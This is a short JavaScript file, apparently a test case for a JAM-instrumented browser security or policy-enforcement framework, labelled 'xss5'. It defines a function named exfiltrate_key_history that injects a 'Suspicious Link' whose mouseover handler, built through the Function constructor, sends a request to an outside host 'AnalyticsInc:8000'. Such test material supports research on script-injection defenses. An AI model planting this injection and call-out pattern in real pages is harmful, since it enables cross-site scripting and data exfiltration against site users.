
JAM.startProfile('load');
function exfiltrate_key_history(){var URL=JAM.call(Function,null,['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss5",true);xmlhttp.send(null);']),script=document.createElement("a");JAM.set(script,"onmouseover",URL);JAM.set(script,"innerHTML","Suspicious Link");URL=document.getElementsByTagName("body")[0];JAM.call(URL.appendChild,URL,[script])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)

JAM.stopProfile('load');
